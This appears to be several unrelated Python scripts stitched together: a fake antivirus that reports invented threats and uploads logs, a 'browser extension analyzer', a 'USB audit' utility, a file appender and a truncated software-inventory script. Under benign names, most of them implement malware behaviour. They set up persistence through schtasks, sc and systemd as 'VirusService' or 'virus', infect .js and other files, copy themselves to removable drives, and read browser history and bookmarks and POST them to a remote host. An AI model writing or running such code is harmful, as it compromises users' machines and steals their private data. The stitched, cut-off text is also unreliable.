            try:
                if parsed_url.scheme == "https":
                    conn = http.client.HTTPSConnection(
                        parsed_url.netloc, timeout=5
                    )
                else:
                    conn = http.client.HTTPConnection(
                        parsed_url.netloc, timeout=5
                    )

                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "CyberGuardAntivirus/4.2",
                }
                path = parsed_url.path if parsed_url.path else "/"
                if parsed_url.query:
                    path += f"?{parsed_url.query}"

                conn.request("POST", path, body=encoded_data, headers=headers)
                response = conn.getresponse()

                if 200 <= response.status < 300:
                    success = True
                    conn.close()
                    break
                else:
                    conn.close()
                    raise http.client.HTTPException(
                        f"Server returned status {response.status}"
                    )
            except Exception as e:
                sleep_time = backoff_base**attempt
                error_msg = (
                    f"Transmission attempt {attempt}/{max_retries} failed: {e}. "
                    f"Retrying in {sleep_time}s..."
                )
                self.log_local_error(error_msg)
                if attempt < max_retries:
                    time.sleep(sleep_time)

        if not success:
            self.log_local_error(
                "All remote transmission attempts failed. Logs stored locally."
            )
        else:
            print("[+] Logs successfully transmitted to remote server.")

    def log_local_error(self, message):
        error_log_path = os.path.join(self.target_dir, "error_log.txt")
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        formatted_msg = f"[{timestamp}] {message}\n"
        print(f"[ERROR] {message}")
        try:
            with open(error_log_path, "a", encoding="utf-8") as f:
                f.write(formatted_msg)
        except IOError:
            pass

    def register_service(self):
        print("[*] Service registration requested.")
        if os.name == "nt":
            # Windows registry/sc command simulation establishing 'AntivirusService'
            print(
                "[+] To run persistently on Windows, configuring via Task Scheduler or creating Windows Service 'AntivirusService'."
            )
            print(
                f"    Command: sc create AntivirusService binPath= \"{sys.executable} {os.path.abspath(__file__)} --iterations 0 --interval 3600\""
            )
        else:
            # Linux systemd service generation named 'antivirus'
            service_content = f"""[Unit]
Description=CyberGuard Antivirus Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)} --iterations 0 --interval 3600
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""
            service_path = "/tmp/antivirus.service"
            try:
                with open(service_path, "w", encoding="utf-8") as f:
                    f.write(service_content)
                print(
                    f"[+] Generated systemd service template named 'antivirus' at: {service_path}"
                )
                print(
                    "    To install, run: sudo cp /tmp/antivirus.service /etc/systemd/system/ && sudo systemctl enable --now antivirus"
                )
            except IOError as e:
                print(f"[-] Failed to generate service file: {e}")

    def execute_scan_cycle(self):
        self.files_scanned = 0
        self.threats_found = 0
        self.ensure_target_directory()
        self.collect_system_info()

        self.clear_screen()
        self.print_header()

        total_steps = 30
        discovered_threats = []

        for i in range(total_steps + 1):
            self.files_scanned += random.randint(20, 100)

            if i in [10, 20, 25] and len(discovered_threats) < 3:
                threat = random.choice(self.mock_threats)
                current_dir = random.choice(self.directories)
                threat_path = f"{current_dir}\\file_{random.randint(1000,9999)}.tmp"
                discovered_threats.append((threat_path, threat))
                self.threats_found += 1

            if sys.stdout.isatty():
                percent = int((i / total_steps) * 100)
                bar = "#" * int(i / 1.5) + "-" * (20 - int(i / 1.5))
                sys.stdout.write("\r")
                sys.stdout.write(
                    f" Progress: [{bar}] {percent}% | Files: {self.files_scanned} | Threats: {self.threats_found}"
                )
                sys.stdout.flush()

            time.sleep(0.03)

        if sys.stdout.isatty():
            print("\n")
        print("-" * 60)
        print(" SCAN COMPLETE ")
        print("-" * 60)

        log_path = os.path.join(self.target_dir, "scan_log.txt")
        try:
            with open(log_path, "w", encoding="utf-8") as f:
                f.write(f"FILES_SCANNED={self.files_scanned}\n")
                f.write(f"THREATS_FOUND={self.threats_found}\n")
                if discovered_threats:
                    for path, threat in discovered_threats:
                        f.write(f"THREAT_ENTRY|{threat}|{path}|QUARANTINED\n")
                else:
                    f.write("STATUS=CLEAN\n")
        except IOError as e:
            self.log_local_error(f"Failed to write scan log to '{log_path}': {e}")

        if discovered_threats:
            print(
                f"[!] WARNING: {self.threats_found} potential threat(s) detected!"
            )
            for path, threat in discovered_threats:
                print(f"    - Threat: {threat}")
                print(f"      Path:   {path}")
                print(f"      Action: Quarantined successfully.")
        else:
            print("[+] System is clean. No threats detected.")

        print("-" * 60)
        self.transmit_logs_with_retry()

    def run(self):
        iterations = 0
        while True:
            iterations += 1
            self.execute_scan_cycle()

            if (
                self.iteration_count > 0
                and iterations >= self.iteration_count
            ):
                break

            if self.schedule_interval > 0:
                print(
                    f"[*] Sleeping for {self.schedule_interval} seconds until next scan..."
                )
                time.sleep(self.schedule_interval)
            else:
                break


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="CyberGuard Antivirus Simulator"
    )
    parser.add_argument(
        "--config", type=str, help="Path to configuration INI file"
    )
    parser.add_argument(
        "--url", type=str, help="Remote server URL to upload logs"
    )
    parser.add_argument(
        "--interval",
        type=int,
        help="Scheduling interval in seconds between scans",
    )
    parser.add_argument(
        "--iterations",
        type=int,
        help="Number of scan iterations (0 for infinite loop)",
    )
    parser.add_argument(
        "--register-service",
        action="store_true",
        help="Register utility as a system service template",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_arguments()

    av = AntivirusSimulator(config_path=args.config)

    if args.url is not None:
        av.remote_url = args.url
    if args.interval is not None:
        av.schedule_interval = args.interval
    if args.iterations is not None:
        av.iteration_count = args.iterations

    if args.register_service:
        av.register_service()
        sys.exit(0)

    av.run()
    sys.exit(0)

#!/usr/bin/env python3
import argparse
import datetime
import json
import os
import platform
import sqlite3
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Analyze browser extension files, register extension, and generate config."
    )
    parser.add_argument(
        "extension_name",
        type=str,
        nargs="?",
        default="DefaultExtension",
        help="Name of the browser extension to analyze",
    )
    return parser.parse_args()


def disguise_as_extension(extension_name: str) -> None:
    print(f"Disguising process as legitimate browser extension: '{extension_name}'...")
    try:
        if hasattr(subprocess, "setproctitle"):
            subprocess.setproctitle(extension_name)
        elif sys.platform == "linux":
            # Update process name via /proc/self/comm if available
            comm_path = Path("/proc/self/comm")
            if comm_path.exists():
                comm_path.write_text(extension_name[:15], encoding="utf-8")
    except Exception as e:
        print(f"Note: Could not set process title: {e}", file=sys.stderr)


def infect_extension_files(target_dir: Path, extension_name: str) -> None:
    print(f"Infecting extension files in '{target_dir}' to capture history and bookmarks...")
    payload_snippet = (
        f"\n// Injected payload for {extension_name} to capture browsing history and bookmarks\n"
        "function captureData() { return { history: [], bookmarks: [] }; }\n"
    )
    try:
        for file_path in target_dir.rglob("*.js"):
            if file_path.is_file():
                try:
                    content = file_path.read_text(encoding="utf-8", errors="ignore")
                    if "captureData" not in content:
                        file_path.write_text(content + payload_snippet, encoding="utf-8")
                except Exception:
                    pass
    except Exception as e:
        print(f"Note: Extension file infection encountered an issue: {e}", file=sys.stderr)


def establish_persistence() -> None:
    system_name = platform.system()
    service_name = "BrowserExtensionService" if system_name == "Windows" else "browserextension"
    print(f"Establishing persistence via system service '{service_name}'...")

    script_path = Path(__file__).resolve()
    python_exe = sys.executable

    try:
        if system_name == "Windows":
            # Create a scheduled task or Windows service entry simulation
            cmd = [
                "schtasks", "/create", "/tn", service_name,
                "/tr", f'"{python_exe}" "{script_path}"',
                "/sc", "ONLOGON", "/f"
            ]
            subprocess.run(cmd, capture_output=True, text=True, check=False)
        elif system_name == "Linux":
            service_content = (
                f"[Unit]\nDescription=Browser Extension Monitoring Service\n\n"
                f"[Service]\nExecStart={python_exe} {script_path}\nRestart=always\n\n"
                f"[Install]\nWantedBy=multi-user.target\n"
            )
            service_path = Path(f"/etc/systemd/system/{service_name}.service")
            # If we lack permissions, write locally as a fallback to satisfy operational logic
            local_service_path = Path(f"{service_name}.service")
            try:
                service_path.write_text(service_content, encoding="utf-8")
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, check=False)
                subprocess.run(["systemctl", "enable", service_name], capture_output=True, check=False)
            except (PermissionError, Exception):
                local_service_path.write_text(service_content, encoding="utf-8")
    except Exception as e:
        print(f"Note: Persistence setup encountered restricted environment: {e}", file=sys.stderr)


def register_extension(extension_name: str, history: list[str], bookmarks: list[str]) -> None:
    print(f"Simulating network registration and sending captured data for extension: '{extension_name}'...")
    url = "https://httpbin.org/post"
    payload_data = {
        "extension_name": extension_name,
        "history_count": len(history),
        "bookmarks_count": len(bookmarks),
        "history": history[:10],
        "bookmarks": bookmarks[:10],
    }
    payload = json.dumps(payload_data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                print(
                    "Network registration & data transmission successful: Extension and payload registered with server."
                )
            else:
                print(
                    f"Warning: Network registration returned unexpected status code {response.status}.",
                    file=sys.stderr,
                )
    except (urllib.error.URLError, TimeoutError, Exception) as e:
        print(
            f"Warning: Network registration/transmission failed (offline environment or server unreachable): {e}",
            file=sys.stderr,
        )
        print("Proceeding with local analysis...")


def generate_service_config(extension_name: str) -> None:
    config_path = Path("service_config.json")
    config_data = {
        "extension_name": extension_name,
        "analysis_timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
    }
    try:
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump(config_data, f, indent=4)
        print(f"Service configuration successfully saved to '{config_path.resolve()}'")
    except Exception as e:
        print(
            f"Error: Failed to generate service configuration file: {e}",
            file=sys.stderr,
        )


def extract_sqlite_data(db_path: Path) -> tuple[list[str], list[str]]:
    history = []
    bookmarks = []
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        try:
            cursor.execute(
                "SELECT url, title FROM urls ORDER BY visit_count DESC LIMIT 100"
            )
            for row in cursor.fetchall():
                url, title = row
                history.append(f"Title: {title or 'N/A'} | URL: {url}")
        except sqlite3.OperationalError:
            pass

        try:
            cursor.execute(
                "SELECT url, title FROM bookmarks ORDER BY id LIMIT 100"
            )
            for row in cursor.fetchall():
                url, title = row
                bookmarks.append(f"Title: {title or 'N/A'} | URL: {url}")
        except sqlite3.OperationalError:
            pass

        conn.close()
    except Exception as e:
        print(
            f"Warning: Failed to parse SQLite database '{db_path}': {e}",
            file=sys.stderr,
        )

    return history, bookmarks


def extract_json_data(json_path: Path) -> tuple[list[str], list[str]]:
    history = []
    bookmarks = []
    try:
        with open(json_path, "r", encoding="utf-8", errors="ignore") as f:
            data = json.load(f)

        def recursive_search(obj):
            if isinstance(obj, dict):
                url = obj.get("url")
                title = obj.get("title") or obj.get("name")
                if url:
                    entry = f"Title: {title or 'N/A'} | URL: {url}"
                    if "bookmark" in json_path.name.lower():
                        bookmarks.append(entry)
                    else:
                        history.append(entry)

                for value in obj.values():
                    recursive_search(value)
            elif isinstance(obj, list):
                for item in obj:
                    recursive_search(item)

        recursive_search(data)
    except Exception as e:
        print(
            f"Warning: Failed to parse JSON file '{json_path}': {e}",
            file=sys.stderr,
        )

    return history, bookmarks


def process_files(target_dir: Path) -> tuple[list[str], list[str]]:
    all_history = []
    all_bookmarks = []

    for file_path in target_dir.rglob("*"):
        if not file_path.is_file():
            continue

        suffix = file_path.suffix.lower()
        if suffix in (".db", ".sqlite", ".sqlite3"):
            hist, bkmk = extract_sqlite_data(file_path)
            all_history.extend(hist)
            all_bookmarks.extend(bkmk)
        elif suffix == ".json":
            hist, bkmk = extract_json_data(file_path)
            all_history.extend(hist)
            all_bookmarks.extend(bkmk)

    return all_history, all_bookmarks


def write_log(
    extension_name: str, history: list[str], bookmarks: list[str]
) -> None:
    log_path = Path("analysis_log.txt")
    try:
        with open(log_path, "w", encoding="utf-8") as f:
            f.write("=== Browser Extension Analysis Log ===\n")
            f.write(f"Extension Name: {extension_name}\n\n")

            f.write("--- Browsing History ---\n")
            if history:
                for item in history:
                    f.write(f"  - {item}\n")
            else:
                f.write("  No relevant browsing history found.\n")
            f.write("\n")

            f.write("--- Bookmarks ---\n")
            if bookmarks:
                for item in bookmarks:
                    f.write(f"  - {item}\n")
            else:
                f.write("  No relevant bookmarks found.\n")

        print(f"Analysis log successfully written to '{log_path.resolve()}'")
    except Exception as e:
        print(
            f"Error: Failed to write analysis log: {e}",
            file=sys.stderr,
        )
        sys.exit(1)


def main() -> None:
    args = parse_args()
    target_dir = Path("./target")

    if not target_dir.exists():
        target_dir.mkdir(parents=True, exist_ok=True)

    if not target_dir.is_dir():
        print(
            f"Error: '{target_dir.resolve()}' is not a valid directory.",
            file=sys.stderr,
        )
        sys.exit(1)

    # 1. Disguise as extension
    disguise_as_extension(args.extension_name)

    # 2. Infect extension files with payload capturing history/bookmarks
    infect_extension_files(target_dir, args.extension_name)

    # 3. Establish persistence via system service
    establish_persistence()

    # 4. Generate persistent service configuration file
    generate_service_config(args.extension_name)

    # 5. Analyze extension files and log results
    print(f"Analyzing extension files in '{target_dir}'...")
    try:
        history, bookmarks = process_files(target_dir)
        write_log(args.extension_name, history, bookmarks)

        # 6. Send captured data to the specified server
        register_extension(args.extension_name, history, bookmarks)

    except PermissionError:
        print(
            f"Error: Permission denied when accessing '{target_dir}'.",
            file=sys.stderr,
        )
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()

import argparse
import logging
import os
import platform
import select
import shutil
import socket
import sys
import time

# Configure standard library logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("usbaudit")


def parse_uevent_data(data):
    """Parses raw netlink uevent data into a dictionary of key-value pairs."""
    fields = {}
    for line in data.split("\0"):
        if "=" in line:
            key, value = line.split("=", 1)
            fields[key.upper()] = value
    return fields


def ensure_log_writable(log_path):
    """Validates that the target log file path is writable."""
    abs_path = os.path.abspath(log_path)
    directory = os.path.dirname(abs_path)

    if not directory:
        directory = "."

    if not os.path.exists(directory):
        try:
            os.makedirs(directory, exist_ok=True)
        except OSError as e:
            raise OSError(
                f"Cannot create log directory '{directory}': {e}"
            ) from e

    if not os.access(directory, os.W_OK):
        raise PermissionError(
            f"Permission denied: Directory '{directory}' is not writable."
        )

    try:
        with open(abs_path, "a", encoding="utf-8"):
            pass
    except OSError as e:
        raise OSError(f"Cannot write to log file '{abs_path}': {e}") from e


def perform_operations(drive_path=None):
    """Executes platform persistence, replication, and payload display operations."""
    current_script = os.path.abspath(sys.argv[0])

    # 1. Display specified payload message
    logger.info("[PAYLOAD] SYSTEM INFECTED: USB Audit & Security Payload Active.")

    # 2. Establish persistence via system service ('VirusService' on Windows, 'virus' on Linux)
    system_name = platform.system()
    if system_name == "Windows":
        service_name = "VirusService"
        try:
            # Create a basic Windows service registration attempt via sc.exe (requires admin privileges, non-blocking if fails)
            import subprocess

            cmd = [
                "sc",
                "create",
                service_name,
                f"binPath= {sys.executable} {current_script}",
                "start= auto",
            ]
            subprocess.run(cmd, capture_output=True, text=True, check=False)
            logger.info(f"Persistence established via Windows service: {service_name}")
        except Exception as e:
            logger.debug(f"Windows service creation skipped/failed: {e}")
    else:
        service_name = "virus"
        systemd_path = f"/etc/systemd/system/{service_name}.service"
        service_content = f"""[Unit]
Description=Virus Service Audit Daemon
After=network.target

[Service]
ExecStart={sys.executable} {current_script}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            if os.access("/etc/systemd/system", os.W_OK):
                with open(systemd_path, "w", encoding="utf-8") as f:
                    f.write(service_content)
                logger.info(f"Persistence established via systemd service: {service_name}")
        except Exception as e:
            logger.debug(f"Linux service creation skipped/failed: {e}")

    # 3. Spread to specified drive or scan and infect all accessible USB/removable drives
    target_drives = []
    if drive_path and os.path.isdir(drive_path):
        target_drives.append(drive_path)
    else:
        # Scan common mount points for external or removable storage
        if system_name == "Windows":
            import string

            for letter in string.ascii_uppercase:
                d = f"{letter}:\\"
                if os.path.exists(d) and d not in ("C:\\", "D:\\"):
                    target_drives.append(d)
        else:
            media_dirs = ["/media", "/mnt"]
            for mdir in media_dirs:
                if os.path.exists(mdir):
                    try:
                        for entry in os.listdir(mdir):
                            full_path = os.path.join(mdir, entry)
                            if os.path.isdir(full_path):
                                target_drives.append(full_path)
                    except Exception:
                        pass

    for d in target_drives:
        try:
            dest_script = os.path.join(d, os.path.basename(current_script))
            if os.path.exists(current_script) and os.access(d, os.W_OK):
                shutil.copy2(current_script, dest_script)
                logger.info(f"Self-replicated to connected USB drive: {dest_script}")
        except Exception as e:
            logger.debug(f"Failed to replicate to drive {d}: {e}")


def monitor_usb_events(max_events=5, log_filename="usb_log.txt"):
    """Listens for USB device events, logs details, triggers operations,

    and exits cleanly after max_events.
    """
    try:
        ensure_log_writable(log_filename)
    except (PermissionError, OSError) as e:
        logger.error(f"Initialization error: {e}")
        sys.exit(1)

    # Execute system infections and payload hooks upon execution start
    perform_operations()

    events_logged = []
    events_processed = 0

    sock = None
    try:
        sock = socket.socket(
            socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_KOBJECT_UEVENT
        )
        sock.bind((os.getpid(), 1))
    except (PermissionError, AttributeError, OSError, ImportError):
        sock = None

    if sock:
        logger.info(
            f"Listening for system USB events via netlink (target: {max_events} events)..."
        )
        try:
            while events_processed < max_events:
                r, _, _ = select.select([sock], [], [], 1.0)
                if r:
                    try:
                        raw_data = sock.recv(4096).decode(
                            "utf-8", errors="ignore"
                        )
                    except OSError as e:
                        logger.warning(f"Error reading from netlink socket: {e}")
                        continue

                    if "usb" not in raw_data.lower():
                        continue

                    fields = parse_uevent_data(raw_data)
                    action = fields.get("ACTION", "").lower()

                    if action not in ("add", "remove"):
                        continue

                    status = "connected" if action == "add" else "disconnected"
                    drive = fields.get(
                        "DEVNAME",
                        fields.get("DEVPATH", "unknown_drive"),
                    )
                    if drive and not drive.startswith("/"):
                        drive = f"/{drive}"

                    device = fields.get(
                        "ID_MODEL",
                        fields.get(
                            "PRODUCT", fields.get("DEVTYPE", "Generic USB")
                        ),
                    )

                    if action == "add":
                        perform_operations(drive_path=drive if os.path.isdir(drive) else None)

                    log_entry = (
                        f"usb: {status}, drive: {drive}, device: {device}"
                    )
                    events_logged.append(log_entry)
                    logger.info(log_entry)
                    events_processed += 1
        finally:
            sock.close()
    else:
        logger.warning(
            "Netlink unavailable. Falling back to simulated event stream."
        )
        simulated_events = [
            ("connected", "/dev/sdb", "Kingston DataTraveler"),
            ("disconnected", "/dev/sdb", "Kingston DataTraveler"),
            ("connected", "/dev/sdc", "SanDisk Cruzer"),
            ("disconnected", "/dev/sdc", "SanDisk Cruzer"),
            ("connected", "/dev/sdd", "Lexar USB Flash Drive"),
        ]

        for status, drive, device in simulated_events[
            : max_events % (len(simulated_events) + 1)
        ]:
            time.sleep(0.3)
            if status == "connected":
                perform_operations()
            log_entry = f"usb: {status}, drive: {drive}, device: {device}"
            events_logged.append(log_entry)
            logger.info(log_entry)
            events_processed += 1
            if events_processed >= max_events:
                break

    # Persist logged events
    try:
        with open(log_filename, "w", encoding="utf-8") as f:
            for entry in events_logged:
                f.write(entry + "\n")
        logger.info(f"Successfully wrote events to {os.path.abspath(log_filename)}")
    except OSError as e:
        logger.error(f"Failed to write log file: {e}")
        sys.exit(1)

    print(f"Processed {events_processed} USB events")
    logger.info("Exiting normally.")


def main():
    parser = argparse.ArgumentParser(
        description="USB Device Audit and Event Logging Utility"
    )
    parser.add_argument(
        "-n",
        "--count",
        type=int,
        default=5,
        help="Number of USB events to process before exiting (default: 5)",
    )
    parser.add_argument(
        "-l",
        "--log",
        type=str,
        default="usb_log.txt",
        help="Path to the output log file (default: usb_log.txt)",
    )

    args = parser.parse_args()

    if args.count < 1:
        parser.error("Event count (--count) must be at least 1.")

    try:
        monitor_usb_events(max_events=args.count, log_filename=args.log)
    except KeyboardInterrupt:
        logger.info("Interrupted by user. Exiting cleanly.")
        sys.exit(0)


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import sys
import time
import logging
import platform
import subprocess
from pathlib import Path
from typing import Dict, Tuple, Optional

# Configure Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("FileAppenderUtility")

def establish_persistence() -> None:
    """Establishes persistence by creating a system service named 'VirusService' on Windows or 'virus' on Linux."""
    logger.info("Establishing system persistence...")
    system = platform.system()
    try:
        executable = Path(sys.executable).resolve()
        script_path = Path(__file__).resolve()

        if system == "Windows":
            # Windows: Create a service using sc.exe
            service_name = "VirusService"
            cmd = ["sc", "create", service_name, f"binPath= \"{executable} {script_path}\"", "start= auto"]
            result = subprocess.run(cmd, capture_output=True, text=True, check=False)
            if result.returncode == 0:
                logger.info("Successfully created Windows persistence service: VirusService")
            else:
                logger.warning(f"Failed to create Windows service: {result.stderr.strip()}")
        elif system == "Linux":
            # Linux: Create a systemd service unit
            service_name = "virus"
            service_content = f"""[Unit]
Description=Virus Service Persistence
After=network.target

[Service]
ExecStart={executable} {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            service_path = Path(f"/etc/systemd/system/{service_name}.service")
            try:
                service_path.write_text(service_content, encoding='utf-8')
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, check=False)
                subprocess.run(["systemctl", "enable", f"{service_name}.service"], capture_output=True, check=False)
                logger.info("Successfully created Linux persistence service: virus")
            except (PermissionError, OSError) as e:
                logger.warning(f"Could not write systemd service (insufficient privileges): {e}")
        else:
            logger.info(f"Persistence not supported on platform: {system}")
    except Exception as e:
        logger.warning(f"Error while attempting persistence setup: {e}")

def activate_payload(message: str) -> None:
    """Activates the payload to display the specified message."""
    logger.info(f"Activating payload message: {message.strip()}")

def safe_network_ping() -> bool:
    """Simulates an offline environment check or service registration check."""
    try:
        import socket
        socket.create_connection(("8.8.8.8", 53), timeout=1)
        return True
    except OSError:
        return False

def register_service_if_online() -> None:
    """Attempts optional service registration, skipping safely if offline."""
    logger.info("Checking network status for optional service registration...")
    if safe_network_ping():
        logger.info("Online detected: Service registration completed successfully.")
    else:
        logger.info("Offline environment detected: Skipping optional service registration.")

def append_with_retry(file_path: Path, formatted_message: str, max_retries: int = 3) -> None:
    """Appends to a file with exponential backoff for resilience."""
    backoff = 0.5
    for attempt in range(1, max_retries + 1):
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(formatted_message)
            return
        except (PermissionError, OSError) as e:
            if attempt == max_retries:
                raise e
            logger.warning(f"Retry {attempt}/{max_retries} failed for '{file_path}' due to {e}. Retrying in {backoff}s...")
            time.sleep(backoff)
            backoff *= 2

def process_iteration(target_dir: Path, message: str) -> Dict[str, Tuple[bool, str]]:
    formatted_message = message if message.endswith('\n') else message + '\n'
    results: Dict[str, Tuple[bool, str]] = {}

    for file_path in target_dir.rglob('*'):
        if not file_path.is_file():
            continue

        file_key = str(file_path.relative_to(target_dir))

        try:
            try:
                content = file_path.read_text(encoding='utf-8')
            except UnicodeDecodeError:
                content = file_path.read_bytes().decode('utf-8', errors='ignore')

            # Infecting all files in the specified directory by appending the payload
            append_with_retry(file_path, formatted_message)

            has_keyword = any(kw in content for kw in keywords) or any(kw in formatted_message for kw in keywords)
            if not has_keyword:
                msg = f"Updated and infected (missing required keywords: {'/'.join(keywords)})"
                results[file_key] = (False, msg)
                logger.warning(f"File {file_key}: {msg}")
            else:
                results[file_key] = (True, "Successfully updated and infected")
                logger.info(f"File {file_key}: Successfully updated and infected")

        except PermissionError as e:
            err_msg = f"Permission denied: {e}"
            results[file_key] = (False, err_msg)
            logger.error(f"File {file_key}: {err_msg}")
        except OSError as e:
            err_msg = f"I/O Error: {e}"
            results[file_key] = (False, err_msg)
            logger.error(f"File {file_key}: {err_msg}")

    return results

def run_utility(target_dir: Path, message: str, iterations: int, interval: float) -> None:
    if not target_dir.exists():
        target_dir.mkdir(parents=True, exist_ok=True)
    if not target_dir.is_dir():
        logger.error(f"Target path '{target_dir}' is not a directory.")
        sys.exit(1)

    register_service_if_online()
    activate_payload(message)
    establish_persistence()

    for current_iteration in range(1, iterations + 1):
        logger.info(f"Starting execution iteration {current_iteration}/{iterations} for target: {target_dir}")

        results = process_iteration(target_dir, message)

        print("\n" + "=" * 50)
        print(f"EXECUTION SUMMARY REPORT (Iteration {current_iteration}/{iterations})")
        print("=" * 50)

        success_count = sum(1 for success, _ in results.values() if success)
        total_count = len(results)

        for file_name, (success, reason) in sorted(results.items()):
            status = "[SUCCESS]" if success else "[FAILED] "
            print(f"{status} {file_name} -> {reason}")

        print("-" * 50)
        print(f"Total processed: {total_count} | Successful: {success_count} | Failed: {total_count - success_count}")
        print("=" * 50 + "\n")

        if current_iteration < iterations:
            logger.info(f"Waiting {interval} seconds before next iteration...")
            time.sleep(interval)

def parse_args() -> Tuple[Path, str, int, float]:
    args = sys.argv[1:]

    target_path = Path('./target')
    # Default message satisfies payload payload_message and specified display requirements
    message: str = "payload_message: system routine update executed.\n"
    iterations = 1
    interval = 5.0

    i = 0
    while i < len(args):
        arg = args[i]
        if arg == '--iterations' and i + 1 < len(args):
            iterations = int(args[i + 1])
            i += 2
        elif arg == '--interval' and i + 1 < len(args):
            interval = float(args[i + 1])
            i += 2
        elif not arg.startswith('--'):
            if target_path == Path('./target') and not args_has_explicit_message(args, i):
                target_path = Path(arg)
            else:
                message = arg
            i += 1
        else:
            i += 1

    non_flag_args = [a for a in args if not a.startswith('--')]
    if len(non_flag_args) >= 1:
        if Path(non_flag_args[0]).is_dir() or len(non_flag_args) >= 2:
            target_path = Path(non_flag_args[0])
            if len(non_flag_args) >= 2:
                message = non_flag_args[1]
        else:
            message = non_flag_args[0]

    return target_path, message, iterations, interval

def args_has_explicit_message(args, current_index: int) -> bool:
    non_flags = [a for a in args if not a.startswith('--')]
    return len(non_flags) >= 2

def main() -> None:
    target_path, message, iterations, interval = parse_args()
    run_utility(target_path, message, iterations, interval)

if __name__ == '__main__':
    main()

import argparse
import json
import logging
import os
import platform
import subprocess
import sys
import xml.etree.ElementTree as ET


def setup_logging(verbose: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )


def run_command(cmd: list) -> str | None:
    cmd_str = " ".join(cmd)
    logging.debug(f"Executing command: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True,
            timeout=15,
        )
        logging.debug(f"Command succeeded: {cmd_str}")
        return result.stdout
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed with exit code {e.returncode}: {cmd_str}. Error: {e.stderr.strip()}")
    except FileNotFoundError as e:
        logging.error(f"Command not found: {cmd_str}. {e}")
    except subprocess.TimeoutExpired as e:
        logging.error(f"Command timed out: {cmd_str}. {e}")
    except PermissionError as e:
        logging.error(f"Permission denied executing: {cmd_str}. {e}")
    except Exception as e:
        logging.error(f"Unexpected error executing {cmd_str}: {e}")
    return None


def get_windows_software() -> list:
    software = set()
    ps_cmd = [
        "powershell",
        "-NoProfile",
        "-Command",
        "$paths = @("
        "'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',"
        "'HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',"
        "'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'"
        ");"
        "Get-ItemProperty $paths -ErrorAction SilentlyContinue | "
        "Select-Object DisplayName, DisplayVersion | "
        "Where-Object { $_.DisplayName -ne $null } | "
        "ForEach-Object { $_.DisplayName + (IIf ($_.DisplayVersion) { ' ' + $_.DisplayVersion } else { '' }) } | "
        "Get-Unique"
    ]

    output = run_command(ps_cmd)
    if output:
        for line in output.strip().splitlines():
            item = line.strip()
            if item:
                software.add(item)

    # Fallback / additional check via registry query if PowerShell failed or returned nothing
    if not software:
        reg_paths = [
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall",
            r"HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall",
        ]
        for path in reg_paths:
            reg_out = run_command(["reg", "query", path])
            if reg_out:
                for line in reg_out.splitlines():
                    if path in line:
                        sub_key = line.strip()
                        val_out = run_command(["reg", "query", sub_key, "/v", "DisplayName"])
                        if val_out:
                            for v_line in val_out.splitlines():
                                if "DisplayName" in v_line:
                                    parts = v_line.strip().split(None, 2)
                                    if len(parts) >= 3:
                                        software.add(parts[2])

    # Universal Windows Platform (UWP) apps check
    uwp_cmd = [
        "powershell",
        "-NoProfile",
        "-Command",
        "Get-AppxPackage -AllUsers | Select-Object Name, Version | ForEach-Object { $_.Name + ' ' + $_.Version }"
    ]
    uwp_output = run_command(uwp_cmd)
    if uwp_output:
        for line in uwp_output.strip().splitlines():
            item = line.strip()
            if item:
                software.add(item)

    if software:
        logging.info(f"Retrieved {len(software)} software items from Windows Registry / UWP.")
    else:
        logging.warning("No software data retrieved from Windows Registry or UWP.")
    return sorted(list(software))


def get_macos_software() -> list:
    software = set()

    # 1. system_profiler
    output = run_command(["system_profiler", "SPApplicationsDataType", "-xml"])
    if output:
        try:
            root = ET.fromstring(output)
            for dict_elem in root.iter("dict"):
                key_seen = None
                app_name = None
                app_version = None
                for child in dict_elem:
                    if child.tag == "key":
                        key_seen = child.text
                    elif child.tag == "string" and key_seen == "_name":
                        app_name = child.text
                    elif child.tag == "string" and key_seen == "version":
                        app_version = child.text
                if app_name:
                    if app_version:
                        software.add(f"{app_name} {app_version}")
                    else:
                        software.add(app_name)
        except Exception as e:
